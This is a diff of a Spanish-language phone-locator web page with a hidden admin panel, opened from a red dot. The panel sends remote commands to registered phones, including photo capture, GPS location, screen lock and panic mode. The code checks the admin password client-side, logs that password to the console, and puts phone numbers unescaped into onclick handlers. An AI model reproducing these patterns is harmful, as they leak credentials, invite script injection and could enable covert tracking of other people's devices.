@@ -1220,92 +1220,133 @@
         const adminClose = document.getElementById('adminClose');
         const adminContent = document.getElementById('adminContent');
         
-        adminDot.addEventListener('click', () => {
+        // Función para abrir el panel admin
+        function abrirPanelAdmin() {
+            console.log('🔴 Abriendo panel admin...');
             adminPopup.classList.add('active');
             if (!isAdminUnlocked) {
                 mostrarLoginAdmin();
             } else {
                 renderAdminPanel();
             }
+        }
+        
+        // Eventos para abrir el panel
+        adminDot.addEventListener('click', abrirPanelAdmin);
+        adminDot.addEventListener('touchend', function(e) {
+            e.preventDefault();
+            abrirPanelAdmin();
         });
         
-        adminClose.addEventListener('click', () => {
+        // Cerrar panel con la X
+        adminClose.addEventListener('click', function() {
             adminPopup.classList.remove('active');
         });
         
-        adminPopup.addEventListener('click', (e) => {
-            if (e.target === adminPopup) adminPopup.classList.remove('active');
+        // Cerrar panel haciendo clic fuera
+        adminPopup.addEventListener('click', function(e) {
+            if (e.target === adminPopup) {
+                adminPopup.classList.remove('active');
+            }
         });
         
         function mostrarLoginAdmin() {
             adminContent.innerHTML = `
-                <div class="empty-state">
-                    <div class="empty-icon">🔒</div>
-                    <div class="empty-text">Ingresa la contraseña de administrador</div>
+                <div style="text-align:center;padding:20px;color:rgba(255,255,255,0.3);">
+                    <div style="font-size:48px;margin-bottom:12px;">🔒</div>
+                    <div style="font-size:14px;margin-bottom:20px;">Ingresa la contraseña de administrador</div>
                 </div>
-                <div class="admin-pass">
-                    <input type="password" id="adminPassInput" placeholder="Contraseña" autocomplete="off">
-                    <button class="btn-primary" id="adminLoginBtn" style="padding:12px;font-size:14px;">🔓 Desbloquear</button>
-                    <div id="adminError" style="color:#fca5a5;font-size:13px;margin-top:8px;display:none;">❌ Contraseña incorrecta</div>
+                <div style="padding:0 10px;">
+                    <input type="password" id="adminPassInput" placeholder="Contraseña" autocomplete="off" style="width:100%;padding:14px;background:rgba(255,255,255,0.05);border:1.5px solid rgba(255,255,255,0.1);border-radius:12px;color:#fff;font-size:16px;outline:none;margin-bottom:12px;text-align:center;">
+                    <button id="adminLoginBtn" style="width:100%;padding:14px;font-size:16px;font-weight:600;color:#0b1120;background:#34d399;border:none;border-radius:12px;cursor:pointer;">🔓 Desbloquear</button>
+                    <div id="adminError" style="color:#fca5a5;font-size:13px;margin-top:10px;text-align:center;display:none;">❌ Contraseña incorrecta</div>
                 </div>
             `;
             
-            setTimeout(() => {
-                const loginBtn = document.getElementById('adminLoginBtn');
+            // Asignar eventos DESPUÉS de crear los elementos
+            setTimeout(function() {
                 const passInput = document.getElementById('adminPassInput');
-                
-                if (loginBtn) {
-                    loginBtn.onclick = adminLogin;
-                }
+                const loginBtn = document.getElementById('adminLoginBtn');
                 
                 if (passInput) {
-                    passInput.onkeydown = (e) => {
-                        if (e.key === 'Enter') adminLogin();
-                    };
                     passInput.focus();
+                    passInput.addEventListener('keydown', function(e) {
+                        if (e.key === 'Enter') {
+                            realizarLogin();
+                        }
+                    });
                 }
-            }, 200);
+                
+                if (loginBtn) {
+                    loginBtn.addEventListener('click', function(e) {
+                        e.preventDefault();
+                        realizarLogin();
+                    });
+                    
+                    loginBtn.addEventListener('touchend', function(e) {
+                        e.preventDefault();
+                        realizarLogin();
+                    });
+                }
+            }, 100);
         }
         
-        function adminLogin() {
+        function realizarLogin() {
             const passInput = document.getElementById('adminPassInput');
             const adminError = document.getElementById('adminError');
             
-            if (!passInput) return;
+            if (!passInput) {
+                console.log('❌ No se encontró el input de contraseña');
+                return;
+            }
             
-            const pass = passInput.value;
+            const pass = passInput.value.trim();
+            console.log('🔑 Contraseña ingresada:', pass ? '***' : '(vacía)');
             
             if (pass === ADMIN_PASSWORD) {
+                console.log('✅ Login admin EXITOSO');
                 isAdminUnlocked = true;
-                adminPopup.classList.remove('active');
-                setTimeout(() => {
-                    adminPopup.classList.add('active');
-                    renderAdminPanel();
-                }, 300);
+                renderAdminPanel();
             } else {
-                if (adminError) adminError.style.display = 'block';
-                passInput.value = '';
-                passInput.focus();
+                console.log('❌ Contraseña INCORRECTA');
+                if (adminError) {
+                    adminError.style.display = 'block';
+                }
+                if (passInput) {
+                    passInput.value = '';
+                    passInput.focus();
+                }
             }
         }
         
         function renderAdminPanel() {
+            console.log('🎛️ Renderizando panel admin...');
+            
             if (!isAdminUnlocked) {
+                console.log('⚠️ Admin no desbloqueado, mostrando login');
                 mostrarLoginAdmin();
                 return;
             }
             
-            database.ref('usuarios').once('value', (snapshot) => {
+            // Mostrar loading
+            adminContent.innerHTML = `
+                <div style="text-align:center;padding:40px;color:rgba(255,255,255,0.3);">
+                    <div style="font-size:40px;margin-bottom:16px;">⏳</div>
+                    <div>Cargando dispositivos...</div>
+                </div>
+            `;
+            
+            database.ref('usuarios').once('value', function(snapshot) {
                 const usuarios = snapshot.val();
                 
                 if (!usuarios) {
                     adminContent.innerHTML = `
-                        <div class="empty-state">
-                            <div class="empty-icon">📭</div>
-                            <div class="empty-text">No hay dispositivos registrados</div>
+                        <div style="text-align:center;padding:40px;color:rgba(255,255,255,0.2);">
+                            <div style="font-size:48px;margin-bottom:12px;">📭</div>
+                            <div style="font-size:14px;">No hay dispositivos registrados</div>
                         </div>
-                        <div class="admin-actions">
-                            <button class="btn-refresh" onclick="renderAdminPanel()">🔄 Actualizar</button>
+                        <div style="padding:10px;display:flex;gap:8px;">
+                            <button onclick="window.actualizarPanel()" style="flex:1;padding:10px;background:rgba(255,255,255,0.04);color:rgba(255,255,255,0.4);border:none;border-radius:10px;font-size:12px;cursor:pointer;">🔄 Actualizar</button>
                         </div>
                     `;
                     return;
@@ -1314,7 +1355,7 @@
                 let html = '';
                 const usuariosArray = Object.entries(usuarios);
                 
-                usuariosArray.forEach(([telefono, datos]) => {
+                usuariosArray.forEach(function([telefono, datos]) {
                     const activo = datos.activo ? 'active' : 'inactive';
                     const estado = datos.activo ? '🟢 Conectado' : '🔴 Desconectado';
                     
@@ -1328,39 +1369,39 @@
                             
                             <div class="section-title">🔊 SONIDO Y VIBRACIÓN</div>
                             <div class="action-buttons">
-                                <button class="btn-sound" onclick="enviarComando('${telefono}', 'sonar')">🔊 Sonar</button>
-                                <button class="btn-vibrate" onclick="enviarComando('${telefono}', 'vibrar')">📳 Vibrar</button>
-                                <button class="btn-vibrate" onclick="enviarComando('${telefono}', 'vibrar_continuo')" style="grid-column:1/-1;">📳 Vibración Continua</button>
+                                <button class="btn-sound" onclick="window.enviarComandoAdmin('${telefono}', 'sonar')">🔊 Sonar</button>
+                                <button class="btn-vibrate" onclick="window.enviarComandoAdmin('${telefono}', 'vibrar')">📳 Vibrar</button>
+                                <button class="btn-vibrate" onclick="window.enviarComandoAdmin('${telefono}', 'vibrar_continuo')" style="grid-column:1/-1;">📳 Vibración Continua</button>
                             </div>
                             
                             <div class="section-title">💡 VISUAL</div>
                             <div class="action-buttons">
-                                <button class="btn-bright" onclick="enviarComando('${telefono}', 'brillar')">💡 Brillo Máx</button>
-                                <button class="btn-flash" onclick="enviarComando('${telefono}', 'linterna')">🔦 Linterna</button>
+                                <button class="btn-bright" onclick="window.enviarComandoAdmin('${telefono}', 'brillar')">💡 Brillo Máx</button>
+                                <button class="btn-flash" onclick="window.enviarComandoAdmin('${telefono}', 'linterna')">🔦 Linterna</button>
                             </div>
                             
                             <div class="section-title">🗣️ VOZ Y CÁMARA</div>
                             <div class="action-buttons">
-                                <button class="btn-voice" onclick="enviarComando('${telefono}', 'voz')">🗣️ Voz</button>
-                                <button class="btn-photo" onclick="enviarComando('${telefono}', 'foto')">📸 Foto</button>
+                                <button class="btn-voice" onclick="window.enviarComandoAdmin('${telefono}', 'voz')">🗣️ Voz</button>
+                                <button class="btn-photo" onclick="window.enviarComandoAdmin('${telefono}', 'foto')">📸 Foto</button>
                             </div>
                             
                             <div class="section-title">📍 UBICACIÓN</div>
                             <div class="action-buttons">
-                                <button class="btn-gps" onclick="enviarComando('${telefono}', 'ubicacion')">📍 GPS</button>
+                                <button class="btn-gps" onclick="window.enviarComandoAdmin('${telefono}', 'ubicacion')">📍 GPS</button>
                             </div>
                             
                             <div class="section-title">🔒 SEGURIDAD</div>
                             <div class="action-buttons">
-                                <button class="btn-lock" onclick="enviarComando('${telefono}', 'bloquear_pantalla')">🔒 Bloquear</button>
-                                <button class="btn-panic" onclick="enviarComando('${telefono}', 'modo_panico')">🚨 PÁNICO</button>
-                                <button class="btn-unlock" onclick="enviarComando('${telefono}', 'desbloquear')" style="grid-column:1/-1;">🔓 Desbloquear</button>
+                                <button class="btn-lock" onclick="window.enviarComandoAdmin('${telefono}', 'bloquear_pantalla')">🔒 Bloquear</button>
+                                <button class="btn-panic" onclick="window.enviarComandoAdmin('${telefono}', 'modo_panico')">🚨 PÁNICO</button>
+                                <button class="btn-unlock" onclick="window.enviarComandoAdmin('${telefono}', 'desbloquear')" style="grid-column:1/-1;">🔓 Desbloquear</button>
                             </div>
                             
                             <div class="section-title">⏹️ CONTROL</div>
                             <div class="stop-actions">
-                                <button class="btn-stop-all" onclick="enviarComando('${telefono}', 'detener_todo')">⏹️ Detener Todo</button>
-                                <button class="btn-del" onclick="eliminarUsuario('${telefono}')">🗑️ Eliminar</button>
+                                <button class="btn-stop-all" onclick="window.enviarComandoAdmin('${telefono}', 'detener_todo')">⏹️ Detener Todo</button>
+                                <button class="btn-del" onclick="window.eliminarUsuarioAdmin('${telefono}')">🗑️ Eliminar</button>
                             </div>
                         </div>
                     `;
@@ -1368,16 +1409,24 @@
                 
                 html += `
                     <div class="admin-actions" style="margin-top:16px;">
-                        <button class="btn-refresh" onclick="renderAdminPanel()">🔄 Actualizar</button>
-                        <button class="btn-clear" onclick="eliminarTodos()">🗑️ Eliminar Todos</button>
+                        <button class="btn-refresh" onclick="window.actualizarPanel()">🔄 Actualizar</button>
+                        <button class="btn-clear" onclick="window.eliminarTodosAdmin()">🗑️ Eliminar Todos</button>
                     </div>
                 `;
                 
                 adminContent.innerHTML = html;
+                console.log('✅ Panel renderizado con', usuariosArray.length, 'usuarios');
             });
         }
+
+        // Funciones globales para los botones del admin
+        window.actualizarPanel = function() {
+            renderAdminPanel();
+        };
         
-        function enviarComando(telefono, accion) {
+        window.enviarComandoAdmin = function(telefono, accion) {
+            console.log('📤 Enviando comando:', accion, 'a', telefono);
+            
             let datosComando = {
                 accion: accion,
                 timestamp: firebase.database.ServerValue.TIMESTAMP
@@ -1401,23 +1450,25 @@
             };
             
             alert(`${iconos[accion] || '✅'} Comando enviado a ${telefono}`);
-        }
+        };
         
-        function eliminarUsuario(telefono) {
+        window.eliminarUsuarioAdmin = function(telefono) {
             if (confirm(`⚠️ ¿Eliminar a ${telefono}?`)) {
                 database.ref('usuarios/' + telefono).remove();
                 database.ref('comandos/' + telefono).remove();
+                alert('✅ Usuario eliminado');
                 renderAdminPanel();
             }
-        }
+        };
         
-        function eliminarTodos() {
-            if (confirm('⚠️ ¿Eliminar TODOS los registros?')) {
+        window.eliminarTodosAdmin = function() {
+            if (confirm('⚠️ ¿Eliminar TODOS los registros? Esta acción no se puede deshacer.')) {
                 database.ref('usuarios').remove();
                 database.ref('comandos').remove();
+                alert('✅ Todos los registros eliminados');
                 renderAdminPanel();
             }
-        }
+        };
 
         // ============================================
         // UTILIDADES
@@ -1428,14 +1479,11 @@
             message.style.display = 'block';
         }
 
-        // Exponer funciones globales
-        window.renderAdminPanel = renderAdminPanel;
-        window.enviarComando = enviarComando;
-        window.eliminarUsuario = eliminarUsuario;
-        window.eliminarTodos = eliminarTodos;
-
         console.log('✅ Localizador de Celulares - SAMUEL_PDH');
+        console.log('🔐 Contraseña acceso:', ADMIN_PASSWORD);
         console.log('🔐 Contraseña admin:', ADMIN_PASSWORD);
+        console.log('🟢 Sistema listo y funcional');
+        console.log('📱 Toca el punto rojo para abrir el panel admin');
     </script>
 </body>
 </html>
